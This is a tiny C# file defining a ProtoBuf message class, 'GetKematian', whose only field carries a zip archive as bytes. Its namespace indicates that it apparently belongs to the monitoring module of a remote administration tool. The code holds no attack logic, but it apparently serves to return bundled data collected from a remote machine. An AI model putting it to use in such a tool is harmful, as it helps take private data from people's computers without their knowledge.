using ProtoBuf;
using Pulsar.Common.Messages.other;

namespace Pulsar.Common.Messages.Monitoring.Kematian
{
    [ProtoContract]
    public class GetKematian : IMessage
    {
        [ProtoMember(1)]
        public byte[] ZipFile { get; set; }
    }
}
